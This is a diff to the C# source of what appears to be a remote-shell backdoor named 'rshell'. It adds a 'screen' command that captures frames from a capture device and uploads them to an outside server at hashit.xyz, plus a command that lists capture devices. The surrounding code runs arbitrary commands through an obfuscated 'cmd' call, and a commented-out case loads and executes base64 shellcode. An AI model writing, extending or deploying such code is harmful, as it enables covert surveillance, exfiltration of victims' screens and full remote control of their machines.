@@ -389,24 +389,56 @@ namespace rshell
                                 message.Add("text", String.Join("\n", dtoken));
                                 break;
 
-                            //                            case "shellc":
-                            //                                if (args.Count == 1)
-                            //                                {
-                            //#if DEBUG
-                            //                                    Logger.Log.WriteLine(args[0]);
-                            //#endif
-                            //                                    IntPtr address;
-                            //                                    ulong size;
-                            //                                    var shellcode = Utils.LoadShellcodeProc<Code>(Convert.FromBase64String(args[0]), out address, out size);
-                            //                                    shellcode();
-                            //                                } 
-                            //                                else
-                            //                                {
-                            //                                    message.Add("text", "WaawWoo");
-                            //                                }
-                            //                                break;
+                            case "screen":
+                                try
+                                {
+                                    int index = Int32.Parse(args[0]);
+                                    byte[] bytes = Utils.GetCaptureFrame(index);
 
-                            default:
+                                    string filename = "screenshot.jpg";
+                                    using (WebClient client = new WebClient())
+                                    {
+                                        File.WriteAllBytes(filename, bytes);
+                                        byte[] Response = client.UploadFile("https://hashit.xyz/upload.php", "screenshot.jpg");
+                                        message.Add("text", "File uploaded");
+                                        File.Delete(filename);
+                                    }
+
+                                }
+                                catch (Exception)
+                                {
+                                    message.Add("text", "File upload failed");
+                                }
+                                break;
+
+                            case "screens":
+                                string[] names = Utils.GetCaptureDevices();
+                                List<string> line = new List<string>();
+                                for (int b = 0; b < names.Length; b++)
+                                {
+                                    line.Add("[" + b.ToString() + "]  " + names[b]);
+                                }
+                                message.Add("text", String.Join("\n", line));
+                                break;
+
+                        //                            case "shellc":
+                        //                                if (args.Count == 1)
+                        //                                {
+                        //#if DEBUG
+                        //                                    Logger.Log.WriteLine(args[0]);
+                        //#endif
+                        //                                    IntPtr address;
+                        //                                    ulong size;
+                        //                                    var shellcode = Utils.LoadShellcodeProc<Code>(Convert.FromBase64String(args[0]), out address, out size);
+                        //                                    shellcode();
+                        //                                } 
+                        //                                else
+                        //                                {
+                        //                                    message.Add("text", "WaawWoo");
+                        //                                }
+                        //                                break;
+
+                        default:
                                     message.Add("text", Utils.Exec(String.Join("", "dmc".ToCharArray().Reverse().ToArray()), "/C " + text, timeout));
                                     break;
                             }
